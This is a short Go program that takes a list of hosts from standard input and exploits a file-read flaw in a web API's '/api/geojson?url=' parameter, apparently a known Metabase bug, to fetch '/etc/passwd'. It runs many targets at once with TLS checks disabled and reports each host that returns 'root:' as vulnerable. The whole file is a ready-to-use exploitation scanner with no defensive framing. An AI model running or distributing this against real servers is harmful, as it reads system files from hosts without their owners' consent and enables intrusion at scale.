package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

func isVulnerable(target string, wg *sync.WaitGroup) {
	url := "https://" + target + "/api/geojson?url=file:////etc/passwd"
	client := http.Client{
		Timeout: 15 * time.Second,
	}
	resp, err := client.Get(url)
	if err != nil {
		fmt.Println("\033[0;31m[-] " + target + "\033[0m")
	} else {
		if resp.StatusCode == http.StatusOK {
			bodyBytes, err := io.ReadAll(resp.Body)
			if err != nil {
				log.Fatal(err)
			}
			bodyString := string(bodyBytes)
			if strings.Contains(bodyString, "root:") {
				fmt.Println("\033[1;32m[+] " + target + " is vulnerable [" + url + "]\033[0m")
			} else {
				fmt.Println("\033[0;31m[-] " + target + "\033[0m")
			}
		} else {
			fmt.Println("\033[0;31m[-] " + target + "\033[0m")
		}
	}

	wg.Done()

}

func main() {
	scanner := bufio.NewScanner(os.Stdin)
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	wg := sync.WaitGroup{}
	for scanner.Scan() {
		target := scanner.Text()
		wg.Add(1)
		go isVulnerable(target, &wg)
	}
	wg.Wait()
}
